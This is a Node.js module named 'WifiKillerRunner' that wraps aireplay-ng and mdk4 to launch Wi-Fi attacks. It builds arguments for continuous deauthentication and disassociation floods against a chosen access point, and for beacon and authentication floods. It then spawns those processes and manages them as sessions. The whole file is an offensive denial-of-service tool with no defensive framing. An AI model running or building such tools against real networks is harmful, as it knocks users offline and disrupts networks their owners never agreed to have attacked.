const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const crypto = require('crypto');

class WifiKillerRunner extends EventEmitter {
  constructor() {
    super();
    this.sessions = new Map();
  }

  buildArgs(mode, opts) {
    const { iface, bssid, channel, count, ssid, duration } = opts;
    if (mode === 'deauth' || mode === 'disassoc') {
      const pkt = mode === 'deauth' ? '--deauth' : '--disassoc';
      const n = count && count > 0 ? String(count) : '0';
      const args = [pkt, n, '-a', bssid];
      if (channel) args.push('-c', String(channel));
      args.push(iface);
      return { bin: 'aireplay-ng', args };
    }
    if (mode === 'beacon' || mode === 'auth') {
      const mdkMode = mode === 'beacon' ? 'b' : 'a';
      const args = [iface, mdkMode];
      if (bssid) args.push('-b', bssid);
      if (channel) args.push('-c', String(channel));
      if (ssid) args.push('-s', ssid);
      if (duration) args.push('-t', String(duration));
      return { bin: 'mdk4', args };
    }
    throw new Error('mode tidak dikenal: ' + mode);
  }

  start(opts) {
    const id = crypto.randomBytes(6).toString('hex');
    const { bin, args } = this.buildArgs(opts.mode, opts);
    this.emit('log', id, '[spawn] ' + bin + ' ' + args.join(' '));
    const proc = spawn(bin, args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const session = { id, proc, meta: Object.assign({}, opts, { bin, args, start: Date.now() }) };
    this.sessions.set(id, session);
    proc.stdout.on('data', (d) => this.emit('log', id, d.toString()));
    proc.stderr.on('data', (d) => this.emit('log', id, d.toString()));
    proc.on('exit', (code, sig) => {
      this.emit('exit', id, { code, sig });
      this.sessions.delete(id);
    });
    proc.on('error', (e) => {
      this.emit('log', id, '[error] ' + e.message);
      this.sessions.delete(id);
    });
    return id;
  }

  stop(id) {
    const s = this.sessions.get(id);
    if (!s) return false;
    try { s.proc.kill('SIGTERM'); } catch (_) {}
    setTimeout(() => {
      try { if (!s.proc.killed) s.proc.kill('SIGKILL'); } catch (_) {}
    }, 2000).unref && setTimeout(() => {}, 0);
    return true;
  }

  list() {
    return Array.from(this.sessions.values()).map((s) => ({
      id: s.id, meta: s.meta, pid: s.proc.pid
    }));
  }
}

module.exports = new WifiKillerRunner();
